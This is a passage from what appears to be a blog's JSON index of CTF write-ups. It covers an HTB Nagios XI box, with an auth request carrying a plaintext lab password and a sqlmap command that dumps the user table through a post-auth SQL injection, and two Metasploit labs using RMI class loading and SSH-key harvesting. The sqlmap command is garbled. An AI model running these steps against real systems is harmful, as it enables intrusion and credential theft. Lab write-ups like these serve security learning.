&#x27;username=svc&amp;password=XjH7VCehowpR1xZB&#x27; https://nagios.monitored.htb/nagiosxi/api/v1/authenticate/``````bash &#123;&quot;username&quot;:&quot;svc&quot;,&quot;user_id&quot;:&quot;2&quot;,&quot;auth_token&quot;:&quot;76064ac8a8a9ece7c349404e1f99a45665e9acfc&quot;,&quot;valid_min&quot;:5,&quot;valid_until&quot;:&quot;Fri, 23 Feb 2024 22:38:15 -0500&quot;&#125;\nwe get an auth token, going back to the nagios directory, we can authenticate and successfully login.\n\nAccording with this CVE there is a Post-Auth SQLi, so let’s try POST &#x2F;nagiosxi&#x2F;admin&#x2F;banner_message-ajaxhelper.php HTTP&#x2F;1.1 to get the admin api_key which is in xi_users in this sqlmap command on the way to add new user with administrative privileges\nsqlmap -u &quot;https://nagios.monitored.htb//nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&amp;id=3&amp;token=curl -ksX POST https://nagios.monitored.htb/nagiosxi/api/v1/authenticate&quot; --level 5 --risk 3 -p id --batch -D nagiosxi --dump -T xi_users | awk -F&#x27;&quot;&#x27; &#x27;&#123;print$12&#125;&#x27;&quot; --level 5 --risk 3 -p id --batch -D nagiosxi --dump -T xi_users\n\n\n","categories":["Writeups"],"tags":["htb"]},{"title":"MSF CTF","url":"/2023/09/15/metasploit-1/","content":"Metasploit ctf I (easy)CTF Scenario:\nThis lab is dedicated to you! No other users are on this network :)\nOnce you start the lab, you will have access to a Kali terminal based instance. This machine has an interface with IP address 192.X.Y.Z.\nThe lab has two target machines which should be located on the same subnet  i.e. 192.X.Y.0&#x2F;24\nThe target systems most of times, belong to “admin” or “root” user.\nDo not attack the gateway located at IP address 192.X.Y.1\nYou can use all tools installed in Kali to complete this lab.\n\nFlags:\nThis lab has only 1 Flag to be collected.\nThe Flag can be identified either by the strings flag, flagX, FLAG, FLAGX.\nThe Flag can either be a normal string or a 32-character random Hex string.\n\nReconchecking our network interfaces, with ip a s this is a command used to display info about the network interfaces on the system.\n\nHaving identified our target target-1, &amp; target-2 , our aim is to exploit the two boxes, so running an nmap scan we see target-1 is running rmiregistry on port 1909 and target-2 is running ssh.\n\nWhat is rmiregistry? it’s a tool in Java used for Remote Method Invocation to manage and look up remote objects on a network,RMI in java allows objects in one Java Virtual Machine to invoke methods on objects residing in another JVM, another remote machine.This provides a way for Java applications to communicate and interact across a network.[https://docs.oracle.com/javase/8/docs/technotes/guides/rmi/index.html](read more)\nmetasploitsince it’s a metasploit ctf we need to check out for some exploit. \nWe find a module that take advantage of the deault configuration of the RMI registry and RMI Activation services, which allow loading classes from any remote (HTTP) URL. \nAs it invokes a method in the RMI Distributed Garbage Collector which is available via every RMI endpoint, it can be used against both rmiregistry and rmid, and against most other (custom) RMI endpoints as well. Note that it does not work against Java Management Extension (JMX) ports since those do not support remote class loading, unless another RMI endpoint is active in the same Java process. \nRMI method calls do not support or  require any sort of authentication.\nexploitSo, loading up everything on metasploit, running the module we get a shell back\n\nstabilizing our shell we go to the home directory under the folder alice there is some ssh keys that we can use and login with since we are already root.\n\nso, having known where the ssh keys are we can background our sessions and use the ssh_creds metasploit module.\nflag.the ssh_creds metasploit module, it will collect the contents of all users’ .ssh directories on the targeted machine.\n\nAfter which we can use the ssh_login module to login into the machine target-2, we are using the login_pubkey cause of the public key we got on the alice folder.\n\nN|B \nI set the rhost to the machine that we are targeting target-2 which is the ip with the .4.\nChecking our sessions we see that we have a new session created and we got the flag.\n\n\n","categories":["Writeups"],"tags":["Metasploit-ctf"]},{"title":"MSF CTF II","url":"/2023/10/05/metasploit-2/","content":"CTF Scenario.\nThis lab is dedicated to you! No other users are on this network\nOnce you start the lab, you will have access to a Kali terminal based instance. This machine has an interface with IP address 192.X.Y.Z.\nThe lab has two target machines which should be located on the same subnet  i.e. 192.X.Y.0&#x2F;24\nThe target systems most of times, belong to “admin” or “root” user.\n\nFlags.\nThis lab has only 1 Flag to be collected.\nThe Flag can be identified either by the strings flag, flagX, FLAG, FLAGX.\n\nReconGet the IP for the target we need to compromise, the run some nmap on them.\nTarget 1Checking off the scan from target-1 we can see it’s running an outdated version of Werkzeug, a utility library for Python that provides tools and libraries for building web applications hence vulnerable to remote code execution. \nHoping on metasploit we find the module that can exploit the outdated version.\nTo be continued ……\n","categories":["Writeups"],"tags":["Metasploit-ctf"]}]